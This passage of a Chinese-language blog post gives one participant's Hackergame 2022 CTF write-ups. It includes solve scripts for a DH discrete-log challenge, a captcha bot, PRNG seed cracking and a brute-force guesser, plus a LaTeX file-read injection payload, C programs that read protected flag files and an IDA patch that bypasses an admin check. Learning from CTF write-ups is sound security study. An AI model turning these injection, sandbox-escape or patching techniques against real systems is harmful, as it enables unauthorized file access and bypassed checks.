不是质数。如此我们可以手推几个，然后在数列网站 OEIS 上搜索得到数列[A000793](https://oeis.org/A000793)，关于这个数列的介绍为 `Landau's function g(n): largest order of permutation of n elements. Equivalently, largest LCM of partitions of n.`\n显然这正是我们要找的，于是复制下面给出的代码就可以生成 $g_1$ 了，而对于 $g_2$ ，我的做法是拿到 $g_2$ 中最大数后面的素数列填充进去，若不能继续填充且空间还有剩余，则使最后两个素数**尽可能大且尽可能相近**。\n最后我的蹩脚算法得出来的界大部分比题目的界要大，有小部分小 $1/10$ 左右，基本上都能大过 $m$ 。\n\n贴一下完整的垃圾代码：\n\n```python\nfrom pwn import *\nfrom sage.all import *\nfrom sympy import primerange, prevprime\n\np = remote(\"202.38.93 .111\", 10114)\n# context.log_level = \"debug\"\ntoken = <your_token>\np.sendlineafter(b\"token: \", token.encode())\np.sendlineafter(b\"> your choice: \", b\"3\")\n\ndef n2perm(l):\n    ll = []\n    i = 1\n    for x in l:\n        ll.append(tuple(range(i, i+x)))\n        i += x\n    return ll\n\ndef aupton(N):  # compute terms a(0)..a(N)\n    V = [1 for _ in range(N+1)]\n    for i in primerange(2, N+1):\n        for j in range(N, i-1, -1):\n            hi = V[j]\n            pp = i\n            while pp <= j:\n                hi = max((pp if j == pp else V[j-pp]*pp), hi)\n                pp *= i\n            V[j] = hi\n    return V\n\ndef get_fac(n):\n    prod = data[n - 1]\n    f = factor(prod)\n    f_ = str(f).split('*')\n    fl = []\n    for i in f_:\n        if '^' in i:\n            fl.append(eval(i.replace('^', '**')))\n        else:\n            fl.append(int(i))\n    return fl\n\ndef get_fac2(n, fl1_prod):\n    fl2 = []\n    i = 2\n    while sum(fl2) < n:\n        if gcd(i, fl1_prod) == 1:\n            fl2.append(i)\n        i += 1\n    if sum(fl2) > n:\n        fl2.pop()\n        fl2.pop()\n        fl2.append(prevprime(n - sum(fl2)))\n    return fl2\n\ndef get_n2l(n):\n    l1 = get_fac(n)\n    l2 = get_fac2(n, prod(l1))\n    return n2perm(l1), n2perm(l2)\n\ndef get_n():\n    p.recvuntil(b'[+] DH public key: n = ')\n    n = int(p.recvline()[:-1].decode())\n    return n\n\ndef get_bound():\n    p.recvuntil(b'[+] The upper bound for my private key is ')\n    bound = int(p.recvline()[:-1].decode())\n    return bound\n\ndef get_pub(g):\n    p.sendlineafter(b'(a list): ',g.encode())\n    p.recvuntil(b' : ')\n    y = eval(p.recvline()[:-1].decode())\n    return y\n\nfor i in range(15):\n    n = get_n()\n    bound = get_bound()\n    info(f\"    n = {n}\")\n    info(f\"bound = {bound}\")\n    S = SymmetricGroup(n)\n    data = aupton(2000)\n    g,g_ = get_n2l(n)\n    g1, g2 = S(g), S(g_)\n    opt = lcm(g1.order(), g2.order())\n    info(f\"  opt = {opt}\")\n    if opt < bound:\n        warning(\"opt < bound\")\n    pub1 = get_pub(str(list(g1.tuple())))\n    pub2 = get_pub(str(list(g2.tuple())))\n    pub1, pub2 = S(pub1), S(pub2)\n    m1, m2 = discrete_log(pub1,g1), discrete_log(pub2,g2)\n    # success(f\"m1 = {m1}\\nm2 = {m2}\")\n    m = crt([m1,m2],[g1.order(),g2.order()])\n    success(f\"    m = {m}\")\n    p.sendlineafter(b'> your answer: ', str(m).encode())\n    res = p.recvline().decode()\n    assert res == 'Good job\\n', res\n\nprint(p.recvline().decode())\n```\n\n## 矩阵之困（未解出）\n\n开赛做完签到后看的第一题，结果最后也成为本场比赛最难的 1 解题（表面看起来是 2 解，但其实两个号都是 mcfx），不得不说我眼光真好（）\n查到三向量内积可表示成 $a^TBc$ ，其中 $B$ 的对角线为 $b$ ，但似乎没什么用。\n用 z3 梭了几天出不来，放弃。\n\n## 片上系统（未解出）\n\n发现 pulseview 还挺有意思。\n\n## 量子藏宝图\n\n挺有意思的，一直只研究后量子密码学，却没看过量子密码，正好补充知识。\n\n## 企鹅拼盘\n\nLevel1 手试即可，结果为 `1000` 。\n\n## 火眼金睛的小E\n\nLevel1 直接装个 bindiff 人工比对，但是正确率不太高，需要多试几次，有时甚至 bindiff 连函数都没检测出来。。。\n","slug":"Hackergame2022-writeups","published":1,"updated":"2023-11-04T18:28:02.125Z","_id":"cl9vhj6a30000og6g1kziaam8","comments":1,"layout":"post","photos":[],"content":"<p>好玩，爆赞！</p>\n<span id=\"more\"></span>\n<h2 id=\"Summary\"><a href=\"#Summary\" class=\"headerlink\" title=\"Summary\"></a>Summary</h2><p>不知不觉，离上一年 Hackergame 都一年了 <del>（有点像废话）</del>，作为我CTF的启蒙赛， Hackergame 2021 拿分最多的其实还是靠 web ，如今我却出乎意料地成为了队里的密码手。<br>今年已经不像上年那么有空，前面的搜索题都没空做。总体来说，虽然做不出来，但好歹也能将大部分题目阅读一遍了。<del>（有进步，但不多）</del><br>没好意思填学校的组，直接在公开组注册，最终得分 2850 ，总排名 145 ，也就只有 math 榜上能看见我了。<br>GZTime 还是如同上年一样直线上分，但意想不到的是 mcfx 也被一个不明来路的直线上分的老六偷了榜一。<br>这里记录一下解出的题的题解，对解不出但尝试过的，也作一些记录，多少从中学到了一些东西。<br>最近要期中考，断断续续更这里吧。</p>\n<hr>\n<h2 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h2><p>点开网页，发现是一个手写签名，四个框内，依次要在 2 秒，1 秒，0.1 秒，0.0 秒内分别写下 <code>2022</code> 才能通过。<br>首先直接靠手速必然是不行的，因为第四个框最多只能留下一个点，于是尝试点了个提交，发现顶上的 url 多了个 <code>?result=????</code>，果然还是和上年一样的套路，四个问号改成 2022 ，回车，得到 flag 。</p>\n<h2 id=\"猫咪问答喵\"><a href=\"#猫咪问答喵\" class=\"headerlink\" title=\"猫咪问答喵\"></a>猫咪问答喵</h2><p>第一问直接搜就有，第二问没找到，第三问也直接搜，第四问没找，第六问爆破出来的（）<br>第五问也没找出来，但是找到一个网站叫 <a href=\"https://search.censys.io/data\">Censys.io</a> ，似乎可以搜索 ssh 的 sha256 指纹查 host ，以及有关一堆乱七八糟的查询，不知道以后能不能用得上。</p>\n<h2 id=\"家目录里的秘密\"><a href=\"#家目录里的秘密\" class=\"headerlink\" title=\"家目录里的秘密\"></a>家目录里的秘密</h2><p>Level1 直接搜目录内文件就有。<br>Level2 没下 Rclone ，以为要找到那个 <code>rclone.config</code> 文件里的真实域名再ftp进去。。。</p>\n<h2 id=\"HeiLang\"><a href=\"#HeiLang\" class=\"headerlink\" title=\"HeiLang\"></a>HeiLang</h2><p><code>Ctrl</code> + <code>H</code>，将 <code>|</code> 全部替换成 <code>]=a[</code> 即可。</p>\n<h2 id=\"Xcaptcha\"><a href=\"#Xcaptcha\" class=\"headerlink\" title=\"Xcaptcha\"></a>Xcaptcha</h2><p>用 <code>pyppeteer</code> 干了，简单粗暴。<br>代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> asyncio</span><br><span class=\"line\"><span class=\"keyword\">from</span> pyppeteer <span class=\"keyword\">import</span> launch</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    browser = <span class=\"keyword\">await</span> launch(&#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;executablePath&#x27;</span>: <span class=\"string\">r&#x27;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;headless&#x27;</span>: <span class=\"literal\">False</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;args&#x27;</span>: [<span class=\"string\">&#x27;--no-sandbox&#x27;</span>, <span class=\"string\">&#x27;--window-size=1366,850&#x27;</span>]</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    page = <span class=\"keyword\">await</span> browser.newPage()</span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.setViewport(&#123;<span class=\"string\">&#x27;width&#x27;</span>:<span class=\"number\">1366</span>,<span class=\"string\">&#x27;height&#x27;</span>:<span class=\"number\">768</span>&#125;)</span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.goto(<span class=\"string\">&#x27;http://202.38.93.111:10047/?token=&lt;your_token&gt;&#x27;</span>) </span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.click(<span class=\"string\">&#x27;.img-fluid&#x27;</span>)</span><br><span class=\"line\">    captcha1 = <span class=\"keyword\">await</span> page.querySelectorEval(<span class=\"string\">&#x27;label[for=&quot;captcha1&quot;]&#x27;</span>, <span class=\"string\">&#x27;node =&gt; node.innerText&#x27;</span>)</span><br><span class=\"line\">    captcha2 = <span class=\"keyword\">await</span> page.querySelectorEval(<span class=\"string\">&#x27;label[for=&quot;captcha2&quot;]&#x27;</span>, <span class=\"string\">&#x27;node =&gt; node.innerText&#x27;</span>)</span><br><span class=\"line\">    captcha3 = <span class=\"keyword\">await</span> page.querySelectorEval(<span class=\"string\">&#x27;label[for=&quot;captcha3&quot;]&#x27;</span>, <span class=\"string\">&#x27;node =&gt; node.innerText&#x27;</span>)</span><br><span class=\"line\">    res1=<span class=\"built_in\">eval</span>(captcha1[:-<span class=\"number\">5</span>])</span><br><span class=\"line\">    res2=<span class=\"built_in\">eval</span>(captcha2[:-<span class=\"number\">5</span>])</span><br><span class=\"line\">    res3=<span class=\"built_in\">eval</span>(captcha3[:-<span class=\"number\">5</span>])</span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.<span class=\"built_in\">type</span>(<span class=\"string\">&#x27;#captcha1&#x27;</span>, <span class=\"built_in\">str</span>(res1))</span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.<span class=\"built_in\">type</span>(<span class=\"string\">&#x27;#captcha2&#x27;</span>, <span class=\"built_in\">str</span>(res2))</span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.<span class=\"built_in\">type</span>(<span class=\"string\">&#x27;#captcha3&#x27;</span>, <span class=\"built_in\">str</span>(res3))</span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.click(<span class=\"string\">&#x27;#submit&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    flag = <span class=\"keyword\">await</span> page.querySelectorEval(<span class=\"string\">&#x27;body &gt; div &gt; p:nth-child(4)&#x27;</span>, <span class=\"string\">&#x27;node =&gt; node.innerText&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">    <span class=\"keyword\">await</span> browser.close()</span><br><span class=\"line\">asyncio.get_event_loop().run_until_complete(main())</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"旅行照片2-0\"><a href=\"#旅行照片2-0\" class=\"headerlink\" title=\"旅行照片2.0\"></a>旅行照片2.0</h2><p>Level1 直接用在线网站就能看，但 EXIF 版本信息显示是 <code>0231</code> ，结合题目提示，改成 <code>2.31</code> 就行。<br>Level2 一开始谷歌和百度识图都出不来，然后发现识图的结果都是夕阳，于是把图片<strong>截去夕阳部分</strong>再谷歌识图，就能得到拍摄角度几乎一样但是白天的日本千叶市美滨区的海洋球场，然后找机场就找头疼了，放弃。<br>在做复变函数的时候无意间发现 wolfram 可以通过看到飞机的地点和时间直接查询航班，但是是会员功能。</p>\n<h2 id=\"猜数字（未解出）\"><a href=\"#猜数字（未解出）\" class=\"headerlink\" title=\"猜数字（未解出）\"></a>猜数字（未解出）</h2><p>写了个脚本暴猜一晚上没出，果然运气还是太差了。<br>正解是 <code>NaN</code> ，不提。<br>这里贴一下我爆破的脚本，供君一乐：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests <span class=\"keyword\">as</span> r</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://202.38.93.111:18000/state&#x27;</span></span><br><span class=\"line\">cookie = <span class=\"string\">&#x27;&lt;your_cookie&gt;&#x27;</span></span><br><span class=\"line\">auth = <span class=\"string\">&#x27;&lt;your_auth&gt;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">guess</span>(<span class=\"params\">num</span>):</span><br><span class=\"line\">    data = <span class=\"string\">f&#x27;&lt;state&gt;&lt;guess&gt;<span class=\"subst\">&#123;num&#125;</span>&lt;/guess&gt;&lt;/state&gt;&#x27;</span></span><br><span class=\"line\">    r.post(url, headers=&#123;<span class=\"string\">&#x27;Cookie&#x27;</span>: cookie, <span class=\"string\">&#x27;authorization&#x27;</span>: auth&#125;, data=data)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>():</span><br><span class=\"line\">    res = r.get(url, headers=&#123;<span class=\"string\">&#x27;Cookie&#x27;</span>: cookie, <span class=\"string\">&#x27;authorization&#x27;</span>: auth&#125;)</span><br><span class=\"line\">    resp = re.findall(<span class=\"string\">r&#x27;&lt;guess less=&quot;(\\w+)&quot; more=&quot;(\\w+)&quot;&gt;(.*?)&lt;/guess&gt;&#x27;</span>, res.text)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> resp:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"string\">&#x27;true&#x27;</span>, <span class=\"string\">&#x27;true&#x27;</span>, <span class=\"string\">&#x27;0&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> resp[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">crack</span>(<span class=\"params\">n</span>):</span><br><span class=\"line\">    guess(<span class=\"built_in\">str</span>(n/<span class=\"number\">1000000</span>))</span><br><span class=\"line\">    less, more, num = check()</span><br><span class=\"line\">    <span class=\"comment\"># print(less, more, num)</span></span><br><span class=\"line\">    left = <span class=\"number\">0</span></span><br><span class=\"line\">    right = <span class=\"number\">1000000</span></span><br><span class=\"line\">    times = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> less != <span class=\"string\">&#x27;true&#x27;</span> <span class=\"keyword\">or</span> more != <span class=\"string\">&#x27;true&#x27;</span>:</span><br><span class=\"line\">        times += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> less == <span class=\"string\">&#x27;true&#x27;</span>:</span><br><span class=\"line\">            left = <span class=\"built_in\">float</span>(num)*<span class=\"number\">1000000</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> more == <span class=\"string\">&#x27;true&#x27;</span>:</span><br><span class=\"line\">            right = <span class=\"built_in\">float</span>(num)*<span class=\"number\">1000000</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        num = (left + right) // <span class=\"number\">2</span></span><br><span class=\"line\">        tmp = num</span><br><span class=\"line\">        guess(<span class=\"built_in\">str</span>(num/<span class=\"number\">1000000</span>))</span><br><span class=\"line\">        less, more, num = check()</span><br><span class=\"line\">        <span class=\"comment\"># print(less, more, num)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> times, tmp</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    l = [<span class=\"number\">500000</span>]</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"comment\"># n = 500000*(len(l)+1) - sum(l)</span></span><br><span class=\"line\">        <span class=\"comment\"># n = min(n, 1000000)</span></span><br><span class=\"line\">        <span class=\"comment\"># n = max(n, 0)</span></span><br><span class=\"line\">        n = <span class=\"number\">1000000</span> - <span class=\"built_in\">sum</span>(l)//<span class=\"built_in\">len</span>(l)</span><br><span class=\"line\">        times, num = crack(n)</span><br><span class=\"line\">        l.append(<span class=\"built_in\">int</span>(num))</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(times, n, num, <span class=\"built_in\">sum</span>(l)//<span class=\"built_in\">len</span>(l))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> times == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;done&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"LaTeX机器人\"><a href=\"#LaTeX机器人\" class=\"headerlink\" title=\"LaTeX机器人\"></a>LaTeX机器人</h2><p>Level1 我的解法：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\newread</span><span class=\"keyword\">\\myread</span> <span class=\"keyword\">\\openin</span><span class=\"keyword\">\\myread</span>=/flag1 <span class=\"keyword\">\\read</span><span class=\"keyword\">\\myread</span> to <span class=\"keyword\">\\fileline</span> <span class=\"keyword\">\\fileline</span>&#123;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Level2 打不通，但找到一个可以取消所有转义的函数 <del>（但我忘了是什么）</del>。</p>\n<h2 id=\"安全的在线测评\"><a href=\"#安全的在线测评\" class=\"headerlink\" title=\"安全的在线测评\"></a>安全的在线测评</h2><p>我 Level1 的解法，但似乎预期是用编译器读？</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// read 2 lines from file</span></span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">400</span>];</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>, buf);</span><br><span class=\"line\"></span><br><span class=\"line\">    FILE *fp = fopen(<span class=\"string\">&quot;./data/static.out&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    fgets(buf, <span class=\"number\">400</span>, fp);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s&quot;</span>, buf);</span><br><span class=\"line\">    fgets(buf, <span class=\"number\">400</span>, fp);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s&quot;</span>, buf);</span><br><span class=\"line\">    fclose(fp);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Flag自动机\"><a href=\"#Flag自动机\" class=\"headerlink\" title=\"Flag自动机\"></a>Flag自动机</h2><p>第一回正式打逆向，首先题目是一个恶作剧程序，就是不给点 <code>狠心夺取</code> 按钮，于是拖进 <code>IDA</code> 看到有 <code>rand</code> 函数，不难联想到按钮的新位置是通过这个函数产生的，于是再查看 <code>rand</code> 函数的调用，发现只有两处——分别是按钮的 X 坐标和 Y 坐标。然后我的解法是把汇编上把位置 patch 成 <code>0</code> ，这样按钮就只刷新在左上角了。点击按钮后，弹出一个提示框——<code>获取flag失败！您不是本机的“超级管理员”！</code> ，于是再次在 <code>IDA</code> 找到一个判断，若该变量不等于 <code>114514</code> ，则弹出失败的提示框，这里在汇编把 <code>jz</code> patch 成 <code>jnz</code> 就行。最后成功获取 flag 。</p>\n<h2 id=\"杯窗鹅影\"><a href=\"#杯窗鹅影\" class=\"headerlink\" title=\"杯窗鹅影\"></a>杯窗鹅影</h2><p>Level1 我的解法如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// read file in /flag1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span> &#123;</span><br><span class=\"line\">    FILE *fp = fopen(<span class=\"string\">&quot;/flag1&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (fp == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;open file failed&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">    fgets(buf, <span class=\"number\">0x100</span>, fp);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s&quot;</span>, buf);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"蒙特卡洛轮盘赌\"><a href=\"#蒙特卡洛轮盘赌\" class=\"headerlink\" title=\"蒙特卡洛轮盘赌\"></a>蒙特卡洛轮盘赌</h2><p>测试得出 <code>clock()</code> 的大小在 1000 左右，那么假定时间基本同步的情况下爆破 1000 次左右即可出结果。<br>编译开 <code>-O3</code> 的情况下目测大约每秒 20 次，大约在 50s 内可出结果。<br>代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> subprocess</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># compile the c program</span></span><br><span class=\"line\">os.system(<span class=\"string\">&#x27;gcc -o setseed setseed.c -O3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">seedtores</span>(<span class=\"params\">seed</span>):</span><br><span class=\"line\">    p = subprocess.run(</span><br><span class=\"line\">            [<span class=\"string\">&#x27;./setseed&#x27;</span>, <span class=\"built_in\">str</span>(seed)],</span><br><span class=\"line\">            stdout=subprocess.PIPE,</span><br><span class=\"line\">            stderr=subprocess.STDOUT</span><br><span class=\"line\">        )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (p.stdout.decode()).split()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">crack</span>(<span class=\"params\">pi2, t</span>):</span><br><span class=\"line\">    p1, p2 = pi2</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        res = seedtores(t)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(res[<span class=\"number\">0</span>],res[<span class=\"number\">1</span>], res[<span class=\"number\">2</span>], end=<span class=\"string\">&#x27;\\r&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> res[<span class=\"number\">1</span>] == p1 <span class=\"keyword\">and</span> res[<span class=\"number\">2</span>] == p2:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> t, res</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            t += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">now = <span class=\"built_in\">int</span>(time.time())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(now)</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">&#x27;202.38.93.111&#x27;</span>, <span class=\"number\">10091</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">token = <span class=\"string\">b&#x27;&lt;your_token&gt;&#x27;</span></span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;token:&#x27;</span>, token)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&#x27;请输入你的猜测（如 3.14159，输入后回车）：&#x27;</span>.encode(), <span class=\"string\">b&#x27;0&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;正确答案是：&#x27;</span>.encode())</span><br><span class=\"line\">p1 = r.recvline().decode().strip()</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&#x27;请输入你的猜测（如 3.14159，输入后回车）：&#x27;</span>.encode(), <span class=\"string\">b&#x27;0&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;正确答案是：&#x27;</span>.encode())</span><br><span class=\"line\">p2 = r.recvline().decode().strip()</span><br><span class=\"line\"></span><br><span class=\"line\">info(<span class=\"string\">&#x27;p1: %s, p2: %s&#x27;</span>, p1, p2)</span><br><span class=\"line\">t, guess = crack((p1, p2), now)</span><br><span class=\"line\">success(<span class=\"string\">&#x27;guess: %s&#x27;</span>, guess)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&#x27;请输入你的猜测（如 3.14159，输入后回车）：&#x27;</span>.encode(), guess[<span class=\"number\">3</span>].encode())</span><br><span class=\"line\">r.sendlineafter(<span 